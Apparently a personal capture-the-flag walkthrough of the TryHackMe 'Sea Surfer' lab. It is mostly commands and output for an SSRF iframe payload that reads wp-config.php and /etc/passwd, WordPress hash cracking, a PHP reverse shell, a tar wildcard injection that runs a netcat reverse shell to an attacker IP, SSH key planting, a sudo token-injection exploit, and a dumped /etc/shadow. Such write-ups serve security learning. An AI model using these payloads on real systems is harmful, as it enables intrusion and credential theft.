### 31052023Wed

[TryHackMe | Sea Surfer](https://tryhackme.com/room/seasurfer)

```
Ride the Wave!
```

https://nananan.github.io/posts/seasurfer/

https://github.com/lassidev/writeups/blob/main/TryHackMe/Sea%20Surfer.md


```
┌──(kali㉿kali)-[~/thm/seasurfer]
└─$ nmap -sC -sV 10.10.90.23          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 07:03 +0630
Nmap scan report for 10.10.90.23
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87e3d432cd51d29670ef5f482250ab67 (RSA)
|   256 27d137b0c53cb5816a7c368a2b639ab9 (ECDSA)
|_  256 7f131bcfe64551b909439a232f503c94 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
```

![[Pasted image 20230531071805.png]]

```
echo "10.10.90.23 seasurfer.thm" | sudo tee -a /etc/hosts
```

http://seasurfer.thm/

![[Pasted image 20230531072102.png]]

http://internal.seasurfer.thm/

![[Pasted image 20230531201310.png]]

```
<?php
$loc = "http://127.0.0.1/";
if(isset($_GET['a'])){
$loc = $_GET['a']; 
}
header('Location: '.$loc);
?>
```

```
php -S 0.0.0.0:80
```

![[Pasted image 20230531203229.png]]


```
<iframe height=2000 width=1000 src="http://ATTACKER_IP/ssrf.php?a=file:///var/www/wordpress/wp-config.php">
```

```
<iframe height=2000 width=1000 src="http://10.17.44.152/ssrf.php?a=file:///etc/passwd">
```

![[Pasted image 20230531203409.png]]

![[Pasted image 20230531203605.png]]

![[Pasted image 20230531203649.png]]


```
<iframe height=2000 width=1000 src="http://10.17.44.152/ssrf.php?a=file:///var/www/wordpress/wp-config.php">
```

![[Pasted image 20230531202224.png]]



![[Pasted image 20230531203936.png]]

![[Pasted image 20230531204517.png]]

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -e -k -b 404 -u http://seasurfer.thm
```

![[Pasted image 20230531213604.png]]

http://seasurfer.thm/adminer/

```
/ ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wordpressuser' );
/** Database password */
define( 'DB_PASSWORD', 'coolDataTablesMan' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

![[Pasted image 20230531213847.png]]

http://seasurfer.thm/adminer/?server=localhost&username=wordpressuser&db=wordpress

![[Pasted image 20230531213931.png]]

```
hashid -m '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/'
```

![[Pasted image 20230531214458.png]]

```
hashcat -m 400 '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/' /usr/share/wordlists/rockyou.txt
```

```
john -w=/usr/share/wordlists/rockyou.txt kyle_wp.hash
```

![[Pasted image 20230531215717.png]]

http://seasurfer.thm/wp-login.php

```
kyle : jenny4ever
```

http://seasurfer.thm/wp-login.php?redirect_to=http%3A%2F%2Fseasurfer.thm%2Fwp-admin%2F&action=confirm_admin_email&wp_lang=en_US

![[Pasted image 20230531215902.png]]

![[Pasted image 20230531215926.png]]

```
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ locate php-reverse-shell.php       
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php

┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ 
```

```
┌──(kali㉿kali)-[~/www]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .

┌──(kali㉿kali)-[~/www]
└─$ ll
total 16
-rwxr-xr-x 1 kali kali 5491 May 31 22:04 php-reverse-shell.php
-rw-r--r-- 1 kali kali   12 May 13 13:14 test.html
-rw-r--r-- 1 kali kali   12 May 13 13:15 test.txt                                                         
┌──(kali㉿kali)-[~/www]
└─$
```

![[Pasted image 20230531220820.png]]

http://seasurfer.thm/i-am-not-existed-page *To response 404.php page and get PHP reverse shell.*

![[Pasted image 20230531221048.png]]

```
$ cd /var/www/internal/maintenance
$ ls -lah
total 12K
drwxrwxr-x 2 kyle     kyle     4.0K Apr 19  2022 .
drwxrwxrwx 4 www-data www-data 4.0K Apr 20  2022 ..
-rwxrwxr-x 1 kyle     kyle      286 Apr 19  2022 backup.sh
$ cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
$
```

```
echo "mkfifo /tmp/lhennp; nc ATTACKER_IP 1234 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
```

```
echo "mkfifo /tmp/lhennp; nc 10.17.44.152 1234 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
```

```
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

```
echo "" > --checkpoint=1
```

![[Pasted image 20230601195025.png]]

![[Pasted image 20230601195102.png]]

```
cat user.txt
THM{SSRFING_TO_LFI_TO_RCE}
```

![[Pasted image 20230601195431.png]]

```
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtBFOcOYPyroXT89k6kqrP1gPBKZ/29utGW9QkJ9fI9ExhH/6wOtAcVkpAKn2Q3Mq96j8WO8qPOByb9o67pn2NXvoru3tOl8fsjsO1QJRchPdhNnZy59H5ssWm/uoi/RtfPbprld7QEc3VQlM+N6A8ocAUfY/6ELlnIGBNugTogKDLKP7y78mNCXODZoejuP11pWXrTawe9rm7fBSSjVFQngxS5ziMloTwyXxhNrRjK9C3Xlbqap8p+kYu7Ttqeaa5jrKg7HPvZ5E/Hn9nHnSA8Tl6wMWAAIMVKljoyFkQ494ehqORTK3UG6d3Wtz4DZacw9nH8Hs6cajEMKS7JucPIrBePBfdmLcIdzEs+vPWsMd6DZVLVNcU6FYLXwhAPSL6YyU4XIVF40E2f1waBHhdivxc0DkDCfJLObMGAbcnmeVUIj67fMrvmB0clK+3qvWqhw+L2JoOoOHqd03Q5jEZ0nwDLE1Tdr6Yn0JWjvotq57HSDkvyeUuF6AgxIHR/os= kyle@seasurfer
```

```
cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpbKeNlTcBKgLoSgxjDhotcHbxA36aypfbfACSr6wkXTCemGGHyhKDi1LeM72HyLPCa3G9mi9uYh2DnyR8cW8O6mzRcqlgj6PrhBL8ZY9doxvtnr33OfKEg8kW2mBmMLa3yrSUn8T948Ry6XmQpKqHHOvja2zI1oW3H2ZTOf7wGeTfFxlLEepI+arFzgFw1rAwhTGkyxJrWEUuo9RjaFzMArysWCSSrpJGwvbnIcEiOnuv1n5RCcETwGldUGEETSgb6UIV5IAB4YS2xbI3+27aJnQuv3GqGJLmHMk/oibfE0fa29qCtvWQtt/c0ch06Vq3F9y6iS2PKT8rf7vR3k/7Fhc0XCPMb8pUvFxmSj1SN0P5zlY48BCSgIyRmp0LsLL9J8YBEtmZoF3Ib60ClTR7Bmx1j1xqfZ8XoKh46dltyJAcFiTDTtb4xwc1m4dOP6UVZ7DIDcgPD3V8Icz3nFMqptPOaa7RWdii3YG+aMbTVJnSObYFwZFXq0AZy47TrGs= kali@kali
```

![[Pasted image 20230601201242.png]]

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpbKeNlTcBKgLoSgxjDhotcHbxA36aypfbfACSr6wkXTCemGGHyhKDi1LeM72HyLPCa3G9mi9uYh2DnyR8cW8O6mzRcqlgj6PrhBL8ZY9doxvtnr33OfKEg8kW2mBmMLa3yrSUn8T948Ry6XmQpKqHHOvja2zI1oW3H2ZTOf7wGeTfFxlLEepI+arFzgFw1rAwhTGkyxJrWEUuo9RjaFzMArysWCSSrpJGwvbnIcEiOnuv1n5RCcETwGldUGEETSgb6UIV5IAB4YS2xbI3+27aJnQuv3GqGJLmHMk/oibfE0fa29qCtvWQtt/c0ch06Vq3F9y6iS2PKT8rf7vR3k/7Fhc0XCPMb8pUvFxmSj1SN0P5zlY48BCSgIyRmp0LsLL9J8YBEtmZoF3Ib60ClTR7Bmx1j1xqfZ8XoKh46dltyJAcFiTDTtb4xwc1m4dOP6UVZ7DIDcgPD3V8Icz3nFMqptPOaa7RWdii3YG+aMbTVJnSObYFwZFXq0AZy47TrGs= kali@kali" >> authorized_keys
```

```
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtBFOcOYPyroXT89k6kqrP1gPBKZ/29utGW9QkJ9fI9ExhH/6wOtAcVkpAKn2Q3Mq96j8WO8qPOByb9o67pn2NXvoru3tOl8fsjsO1QJRchPdhNnZy59H5ssWm/uoi/RtfPbprld7QEc3VQlM+N6A8ocAUfY/6ELlnIGBNugTogKDLKP7y78mNCXODZoejuP11pWXrTawe9rm7fBSSjVFQngxS5ziMloTwyXxhNrRjK9C3Xlbqap8p+kYu7Ttqeaa5jrKg7HPvZ5E/Hn9nHnSA8Tl6wMWAAIMVKljoyFkQ494ehqORTK3UG6d3Wtz4DZacw9nH8Hs6cajEMKS7JucPIrBePBfdmLcIdzEs+vPWsMd6DZVLVNcU6FYLXwhAPSL6YyU4XIVF40E2f1waBHhdivxc0DkDCfJLObMGAbcnmeVUIj67fMrvmB0clK+3qvWqhw+L2JoOoOHqd03Q5jEZ0nwDLE1Tdr6Yn0JWjvotq57HSDkvyeUuF6AgxIHR/os= kyle@seasurfer
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpbKeNlTcBKgLoSgxjDhotcHbxA36aypfbfACSr6wkXTCemGGHyhKDi1LeM72HyLPCa3G9mi9uYh2DnyR8cW8O6mzRcqlgj6PrhBL8ZY9doxvtnr33OfKEg8kW2mBmMLa3yrSUn8T948Ry6XmQpKqHHOvja2zI1oW3H2ZTOf7wGeTfFxlLEepI+arFzgFw1rAwhTGkyxJrWEUuo9RjaFzMArysWCSSrpJGwvbnIcEiOnuv1n5RCcETwGldUGEETSgb6UIV5IAB4YS2xbI3+27aJnQuv3GqGJLmHMk/oibfE0fa29qCtvWQtt/c0ch06Vq3F9y6iS2PKT8rf7vR3k/7Fhc0XCPMb8pUvFxmSj1SN0P5zlY48BCSgIyRmp0LsLL9J8YBEtmZoF3Ib60ClTR7Bmx1j1xqfZ8XoKh46dltyJAcFiTDTtb4xwc1m4dOP6UVZ7DIDcgPD3V8Icz3nFMqptPOaa7RWdii3YG+aMbTVJnSObYFwZFXq0AZy47TrGs= kali@kali
```

![[Pasted image 20230602074414.png]]

![[Pasted image 20230601201600.png]]

```
ssh -i id_rsa_kyle kyle@10.10.3.90
```

![[Pasted image 20230602074908.png]]

![[Pasted image 20230602075515.png]]

https://packages.ubuntu.com/focal/amd64/gdb/download

```
http://th.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb
```

![[Pasted image 20230602075708.png]]

```
wget -c http://10.17.44.152/gdb_9.1-0ubuntu1_amd64.deb
```

![[Pasted image 20230602080123.png]]

https://github.com/nongiach/sudo_inject

https://raw.githubusercontent.com/nongiach/sudo_inject/master/exploit.sh

```
wget -c https://raw.githubusercontent.com/nongiach/sudo_inject/master/exploit.sh

wget -c http://10.17.44.152/exploit.sh
```

![[Pasted image 20230602080632.png]]

![[Pasted image 20230602080655.png]]

![[Pasted image 20230602081315.png]]

```
export PATH=$(pwd):$PATH
```

![[Pasted image 20230602082624.png]]

```
wget -c https://raw.githubusercontent.com/nongiach/sudo_inject/master/exploit_v3.sh

wget -c http://10.17.44.152/exploit_v3.sh
```

![[Pasted image 20230602083008.png]]

```
./gdb -q -n -p 1446
```

```
/home/kyle/usr/bin/gdb
```

![[Pasted image 20230602085543.png]]

```
cat /etc/pam.d/sudo
```

![[Pasted image 20230602092529.png]]

![[Pasted image 20230602092733.png]]

```
./gdb -q -n -p 1124
```

```
export SSH_AUTH_SOCK=agent.1123
```

```
ssh-add -l
3072 SHA256:boZASmxRncp8AM+gt1toNuZr9jh1dyatwf9DPZYit88 kyle@seasurfer (RSA)
```

![[Pasted image 20230602094016.png]]

```
THM{STEALING_SUDO_TOKENS}
```

```
root:$6$.9UYMpR5KjzCtBNX$IgtvgJRCWrWG2nQY3Opv2T7F9rAfYCWb.TJONX3ZV1fL/D8.2sPaaIrjdoDRtVgngCavn1d9wcA2hchyBb33U.:19100:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
landscape:*:19046:0:99999:7:::
pollinate:*:19046:0:99999:7:::
usbmux:*:19098:0:99999:7:::
sshd:*:19098:0:99999:7:::
systemd-coredump:!!:19098::::::
kyle:$6$zkr5fgOwOuT/5IF8$ubZmZrYcDS9KtdJwmWX8c.72hhiJQBjiEyIfxkv8SWfjO/occ8kZorqdjgdMfRgrsQOKijya1ThUxzL8byzLe1:19102:0:99999:7:::
lxd:!:19098::::::
mysql:!:19099:0:99999:7:::
```

![[Pasted image 20230723091013.png]]
